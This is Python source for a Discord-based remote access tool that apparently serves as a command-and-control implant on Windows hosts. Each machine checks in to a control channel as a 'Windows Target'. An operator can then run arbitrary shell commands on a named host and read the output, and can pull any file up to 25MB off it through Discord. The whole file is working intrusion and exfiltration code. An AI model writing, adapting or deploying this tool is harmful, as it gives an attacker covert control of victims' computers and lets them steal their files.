import discord
import subprocess
import os
import asyncio
import platform

intents = discord.Intents.default()
intents.message_content = True

# AutoShardedClient allows the same token to sit on multiple machines 
# without fighting over the Discord gateway connection.
client = discord.AutoShardedClient(intents=intents)

# CONFIGURATION
CONTROL_CHANNEL_ID = C2_CHANNEL_ID  
ADMIN_USER_ID = ADMIN_DISCORD_USER_ID      

COMPUTER_NAME = platform.node().upper()

@client.event
async def on_ready():
    channel = client.get_channel(CONTROL_CHANNEL_ID)
    if channel:
        await channel.send(f"🖥️ **Windows Target [{COMPUTER_NAME}] is online.** Ready for actions.")

@client.event
async def on_message(message):
    if message.author == client.user or message.channel.id != CONTROL_CHANNEL_ID or message.author.id != ADMIN_USER_ID:
        return

    # FEATURE 1: Target execution
    if message.content.startswith("!exec "):
        parts = message.content[6:].split(" ", 1)
        if len(parts) < 2: return
            
        target_machine = parts[0].upper()
        command = parts[1]

        if target_machine == COMPUTER_NAME:
            await message.channel.send(f"⚙️ `[{COMPUTER_NAME}]` Running command: `{command}`...")
            
            try:
                # Offload the heavy blocking Windows command to a background thread
                loop = asyncio.get_event_loop()
                
                def run_cmd():
                    return subprocess.run(
                        command, shell=True, capture_output=True, text=True, errors="replace", timeout=30
                    )
                
                result = await loop.run_in_executor(None, run_cmd)
                
                output = result.stdout if result.stdout else result.stderr
                if not output: output = "[Executed successfully with no text output]"
                
                if len(output) > 1900:
                    with open(f"{COMPUTER_NAME}_out.txt", "w", encoding="utf-8") as f:
                        f.write(output)
                    await message.channel.send(
                        content=f"📁 `[{COMPUTER_NAME}]` Output too long for chat. Sent as file:", 
                        file=discord.File(f"{COMPUTER_NAME}_out.txt")
                    )
                    os.remove(f"{COMPUTER_NAME}_out.txt")
                else:
                    await message.channel.send(f"```cmd\n[{COMPUTER_NAME} Output]\n{output}\n```")
            except asyncio.TimeoutError:
                await message.channel.send(f"❌ `[{COMPUTER_NAME}]` Error: Command timed out after 30 seconds.")
            except Exception as e:
                await message.channel.send(f"❌ `[{COMPUTER_NAME}]` Execution failed: `{str(e)}`")

    #FEATURE 2: File Download
    elif message.content.startswith("!download "):
        parts = message.content[10:].split(" ", 1)
        if len(parts) < 2: return
            
        target_machine = parts[0].upper()
        file_path = parts[1].strip().replace('"', '')

        if target_machine == COMPUTER_NAME:
            if not os.path.exists(file_path):
                await message.channel.send(f"❌ `[{COMPUTER_NAME}]` Error: File path does not exist.")
                return

            # Note: 2026 Discord non-premium limit is 25MB
            file_size_mb = os.path.getsize(file_path) / (1024 * 1024)
            if file_size_mb > 25:
                await message.channel.send(f"❌ `[{COMPUTER_NAME}]` Error: File is {file_size_mb:.2f}MB. (Max 25MB)")
                return

            await message.channel.send(f"📤 `[{COMPUTER_NAME}]` Uploading: `{os.path.basename(file_path)}`...")
            try:
                await message.channel.send(content=f"✅ File fetched from `[{COMPUTER_NAME}]`:", file=discord.File(file_path))
            except Exception as e:
                await message.channel.send(f"❌ `[{COMPUTER_NAME}]` Upload failed: `{str(e)}`")

    #FEATURE 3: Broadcast Ping
    elif message.content.strip() == "!pingall":
        await message.channel.send(f"👋 `[{COMPUTER_NAME}]` is alive and active!")

client.run("BOT_TOKEN")
